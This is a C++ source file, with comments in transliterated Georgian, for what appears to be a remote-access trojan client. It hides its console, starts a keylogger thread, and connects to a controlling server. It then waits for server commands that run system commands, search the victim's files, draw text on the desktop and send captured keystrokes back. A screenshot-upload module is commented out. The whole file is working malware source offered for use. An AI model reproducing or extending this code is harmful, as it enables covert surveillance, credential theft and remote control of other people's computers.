
		#include"head.h"
		#include"sokets.cpp"
		#include "filesearch.cpp";

HFONT create_font(HWND hwnd)
{
HFONT hfont;
hfont=CreateFont(22,0,0,0,FW_BOLD,0,0,0,0,0,0,2,0,"SYSTEM_FIXED_FONT");
//SendMessage(hwnd,WM_SETFONT,(UINT)hfont,0);
return hfont;
}
void  main()
{ 
	FreeConsole();
	/////////////// keylogeris gashveba ////////////////////

	
		CreateThread(0,0,keyloger,0,0,0);
	///////////////////////////////////////////////////////
	HFONT hfont=create_font(GetDesktopWindow());
	SOCKET sock;
	soketss(&sock); //// soketis sheqmna
	
	
	
///////////////////// programis identificireba tu meramdene programaa qselshi gashvebuli "numeracia"//
	char IDI[10];
	 recv(sock,IDI,10,0);
	 int IDC1=atoi(IDI);
	// MessageBox(0,IDI,IDI,0);
/////////////////////////////////////////////////////////////////////////////////////////////////////
static bool firststart=1;
HDC hdc=GetDC(GetDesktopWindow());
char buf[4096];
char buf1[30]; ///shetyobinebis gagzavnistvis  imis shesaxeb rom ID debi daemtxva ertmanets an rom globalurad agzavni yvelas kompiuterze
string userInput;
int sendResult;
do
{
	memset(buf,0,sizeof(buf));
	int bytesReceived=recv(sock,buf,4095,0);
	userInput="\r\n";
	int IDC=atoi(buf);
	if(bytesReceived<=0){
				/////////////////////////////// tu kavshiri gawyda vidaxebt xelmeored soket funqcias kavshiris agdgenisatvis ///////
				soketss(&sock);
		//	MessageBox(0,",tytrytyt",0,0);
			}


		/////////////////////////// individualuri brdzanebebi //////////////////////////////////////
	if(userInput.size() > 0&&IDC==IDC1) /// IDdebis shedareba 
	{		memset(buf1,0,sizeof(buf1));
			strcat(buf1,"PROGRAMA::");
			strcat(buf1,IDI);
			strcat(buf1,"::ELODEBA BRDZANEBAS\r\n");

		 sendResult = send(sock,buf1,strlen(buf1)+1,0); //// shetyobinebis gagzavna imis shesaxeb rom konkretuli programa 

		firststart=0;
		 if(sendResult != SOCKET_ERROR)					//// romlis aidic miutitet mzad aris da elodeba brdzanebas 
		{
			 ZeroMemory(buf,4096);
			 bytesReceived = recv(sock,buf,4096,0);
			if(bytesReceived<=0){
				/////////////////////////////// tu kavshiri gawyda vidaxebt xelmeored soket funqcias kavshiris agdgenisatvis ///////
				soketss(&sock);
		//	MessageBox(0,",tytrytyt",0,0);
			}
			if(bytesReceived>0)
			{

		//		cout<< "SERVER> " <<string(buf,0,bytesReceived)<<endl;


///// desktopze teqstis gamotana washla *,#
#include"TextisGamotanaWashla.cpp" 
/////////////////////////// system brdzaneba ~
#include"SystemCommands.cpp"
			
#include"kavshirisShemowmeba.cpp"


///// es aris failebis dzebna //////////////
#include"failebisdzebna.cpp"

////////// keilogeris mier shevsebuli buferis gagzavna gasuftaveba %,%d
#include"keylogerisBrdzaneba.cpp"
///////////////// suratis gagzavna serverze //////////////////
//#include"suratisGagzavna.cpp"

			}

		}
	
	}
	
	/////////////////////////// END individualuri brdzanebebi //////////////////////////////////////

	////////////////////////// globaluri brdzanebebi yvela kompiuteristvis /////////////////////////
	#include"globb.cpp"
//////////////////////////END glob ///////////////////////
}while(userInput.size()>0);
 /// aq itisheba kavshiri da wyvets mushaobas orive programa
closesocket(sock);

WSACleanup();
}